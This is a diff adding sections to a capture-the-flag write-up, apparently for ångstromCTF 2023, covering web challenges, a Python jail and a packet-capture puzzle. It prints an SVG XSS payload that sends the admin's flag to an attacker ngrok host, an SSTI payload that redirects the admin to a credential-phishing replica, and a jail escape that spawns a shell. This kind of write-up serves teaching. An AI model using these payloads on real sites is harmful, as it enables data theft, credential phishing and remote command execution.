@@ -753,6 +753,144 @@ if __name__ == "__main__":
 
 # Web
 
+## Hallmark
+
+The challenge consists on two websites: one contains the application, for which the source code is provided, and the other allows us to submit a link to the admin bot.
+
+The main application contains a form from which we can create greeting cards, either by inserting text or selecting one of the proposed images. The card is created via a `POST` request, and it can be recovered from the `/card` endpoint, specifying its id.
+
+From the source code we can see two more interesting endpoints:
+ - `/flag` retrieves the flag for the admin;
+ - the `PUT` method for `/card/` allow us to edit a card.
+
+The interesting part of the source code is the following:
+
+ - Retrieving the flag:
+```javascript
+app.get("/flag", (req, res) => {
+    if (req.cookies && req.cookies.secret === secret) {
+        res.send(flag);
+    } else {
+        res.send("you can't view this >:(");
+    }
+});
+```
+
+ - Retrieving a card
+```javascript
+app.get("/card", (req, res) => {
+    if (req.query.id && cards[req.query.id]) {
+        res.setHeader("Content-Type", cards[req.query.id].type);
+        res.send(cards[req.query.id].content);
+    } else {
+        res.send("bad id");
+    }
+```
+
+ - Creating a card
+
+```javascript
+app.post("/card", (req, res) => {
+    let { svg, content } = req.body;
+
+    let type = "text/plain";
+    let id = v4();
+
+    if (svg === "text") {
+        type = "text/plain";
+        cards[id] = { type, content }
+    } else {
+        type = "image/svg+xml";
+        cards[id] = { type, content: IMAGES[svg] }
+    }
+
+    res.redirect("/card?id=" + id);
+});
+```
+
+ - Updating a card
+
+```javascript
+app.put("/card", (req, res) => {
+    let { id, type, svg, content } = req.body;
+
+    if (!id || !cards[id]){
+        res.send("bad id");
+        return;
+    }
+
+    cards[id].type = type == "image/svg+xml" ? type : "text/plain";
+    cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;
+
+    res.send("ok");
+});
+```
+
+We can clearly see that there's an issue with the `PUT` endpoint: while the type of the card is set by checking the `type` parameter with loose comparison (`==`), the content is set by checking it again with a strict comparison (`===`). You can check the coercion corner cases [here](https://getify.github.io/coercions-grid/).
+
+By exploiting the `img/svg+xml` content type we can craft a content to perform an XSS attack on the admin.
+
+So, we craft our payload like this:
+
+```http
+PUT /card HTTP/1.1
+Host: hallmark.web.actf.co
+Content-Length: 904
+Content-Type: application/x-www-form-urlencoded
+....
+
+id=<card_id>&type[0]=image%2fsvg%2bxml&svg=&content=%3c%3fxml%20version%3d%221.0%22%20standalone%3d%22no%22%3f%3e%0a%3c!DOCTYPE%20svg%20PUBLIC%20%22-%2f%2fW3C%2f%2fDTD%20SVG%201.1%2f%2fEN%22%20%22http%3a%2f%2fwww.w3.org%2fGraphics%2fSVG%2f1.1%2fDTD%2fsvg11.dtd%22%3e%0a%0a%3csvg%20version%3d%221.1%22%20baseProfile%3d%22full%22%20xmlns%3d%22http%3a%2f%2fwww.w3.org%2f2000%2fsvg%22%3e%0a%20%20%3cpolygon%20id%3d%22triangle%22%20points%3d%220%2c0%200%2c50%2050%2c0%22%20fill%3d%22%23009900%22%20stroke%3d%22%23004400%22%2f%3e%0a%20%20%3cscript%20type%3d%22text%2fjavascript%22%3e%0a%20%20%20%20fetch(%22https%3a%2f%2fhallmark.web.actf.co%2fflag%22).then((res)%3d%3e%20res.text()).then(%20data%20%3d%3e%20%7b%0a%20%20%20%20%20%20document.location%3d%22<ngrok url>%2f%22%2bbtoa(data)%3b%0a%20%20%20%20%7d)%3b%0a%20%20%3c%2fscript%3e%0a%3c%2fsvg%3e
+```
+
+where:
+ - the type parameter is the vector `[ "image/svg+xml" ]`, which will be interpreted as a string on the first comparison, leading to the content type `image/svg+xml`, and will fail the second comparison, leading to the content being set to our content;
+ - The content is the following XML, which causes the flag to be sent to our ngrok server:
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+    fetch("https://hallmark.web.actf.co/flag").then((res)=> res.text()).then( data => {
+      document.location="<ngrok url>/"+btoa(data);
+    });
+  </script>
+</svg>
+```
+
+
+## Broken Login
+
+The application consists on two pages: one contains the main application, and the other allows us to send a link to the admin bot. The source code for both pages is provided.
+
+The admin bot is simply a bot that opens the page and logs in with its credentials.
+The application is made in Flask, and we can clearly see a feature not visible from the web page in the source:
+
+```Python
+@app.get("/")
+def index():
+    global fails
+    custom_message = ""
+
+    if "message" in request.args:
+        if len(request.args["message"]) >= 25:
+            return render_template_string(indexPage, fails=fails)
+        
+        custom_message = escape(request.args["message"])
+    
+    return render_template_string(indexPage % custom_message, fails=fails)
+```
+
+If the message parameter is present and its length is less than 25, it is escaped and injected on the page template!
+We can exploit this SSTI with the following payload: `https://brokenlogin.web.actf.co/?0=<payload>&message={{request.args|safe}}`
+
+Since the message parameter is escaped and its length is less than 25, we cannot directly insert our payload into it. We exploit a second parameter, which we call `0`, to provide the payload and we insert it into the page by using the SSTI to print the args into the page. Moreover, we apply the `safe` filter to mark it safe and avoid sanitization of the input.
+
+The payload which we insert is the following: `<script>document.location="<ngrok url>"</script>`, while in our url we have an exact replica of the login page.
+
+By sending the admin this malicious link, he will first be redirected to our page, on which he will insert its credentials and submit the form to our same server.
+
+
 ## Filestore
 
 We are given the source code for a simple PHP application, as well as a Dockerfile and a couple of ELFs.
@@ -902,3 +1040,57 @@ with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
 ```
 
 P.S. when solving the challenge, this script worked at the first execution. Now it doesn't seem to find the flag. We may have got lucky with a very low `uniqid()` value for the microseconds. There may also be a smarter solution as well, but an online bruteforce of $~10^6$ looks feasible enough to me 🙃.
+
+# Misc
+
+## Obligatory
+
+The challenge consists on a python jail.
+The code is given:
+```Python
+#!/usr/local/bin/python
+cod = input("sned cod: ")
+
+if any(x not in "q(jw=_alsynxodtg)feum'zk:hivbcpr" for x in cod):
+    print("bad cod")
+else:
+    try:
+        print(eval(cod, {"__builtins__": {"__import__": __import__}}))
+    except Exception as e:
+        print("oop", e)
+```
+
+To exploit this jail we will use the following:
+ - The [walrus operator](https://docs.python.org/3/whatsnew/3.8.html#assignment-expressions), `:=`, which allows assignments inside expressions;
+ - The [`__builtins__` variable](https://docs.python.org/3/library/builtins.html), which contains the module with all built-in identifiers;
+ - [Lambda expressions](https://docs.python.org/3/tutorial/controlflow.html?highlight=lambda#lambda-expressions);
+ - `and` operator, to execute multiple things.
+
+The payload to exploit this challenge is `(__builtins__:=__import__('os'))and((lambda:system('sh'))())`, which works as follows:
+ 1. First it overrides `__builtins__` to make all `os` symbols available;
+ 2. Then something else is executed by using `and`;
+ 3. A lambda function is created, and it will call `system('os')`;
+ 4. The lambda function is executed via `()`, and spawn a shell for us.
+
+Once we have the shell, we can list and cat the flag:
+![Exploit execution](/images/angstrom2023_obligatory_execution.jpg)
+
+# Network
+
+## Admiral shark
+
+The challenge consists on a network capture of a conversation, in which we have to find the flag.
+
+At some point, in frame 91, we can clearly see some XMLs sent from `10.0.2.4` to `10.0.2.15`:
+
+```
+140008080800177a905600000000000000000000000018000000786c2f64726177696e67732f64726177696e67312e786d6c9dd05d6ec2300c07f013ec0e55de695a181343145ed04e300ee0256e1b918fca0ea3dc7ed14a36697b011e6dcb3ff9efcd6e74b6f84462137c23eab212057a15b4f15d230eef6fb395283882d76083c7465c90c56efbb41935adcfbca722ed7b5ea7b2117d8cc35a4a563d3ae0320ce8d3b40de420a6923aa909ce497656ceabea45f240089a7bc4b89f26e2eac1039a03e3f3fe4dd784b6350af7419d1cfa3821841662fa05f766e0aca907ae513d50fc01c67f82338a028736962ab8eb29d94842fd3c0938fe1af5ddc852becad55fc8dd14c7011d4fc32cb9437ac887b1265ebe93654677ee81b768031d81cbc8b838f8e3ddb12ac936b5282b6cb15edeadccb322b75f504b0708076269830501000007030000504b0304140008080800177a905600000000000000000000000018000000.....
+```
+
+This pattern repeats on the data and can be read as follows:
+ - the part right after `00018000000` contains the filename, in the provided example is `xl/drawings/drawing1.xml`;
+ - the remaining part before the next filename is the content of the file, compressed using the deflate algorithm.
+
+We're able to extract the flag from the data with the following CyberChef filter: `Split('00786c','0d0a00786c')Split('786d6c','786d6c0d0a')From_Hex('None')Fork('\\r\\n','\\n',true)Raw_Inflate(0,0,'Adaptive',false,false)Merge(true)Regular_expression('User defined','ctf{[a-zA-Z0-9_]*}',true,true,false,false,false,false,'List matches')`.
+![CyberChef screenshot of the applied filters](/images/angstrom2023_cyberchef.jpg "CyberChef filters to extract the flag")
+
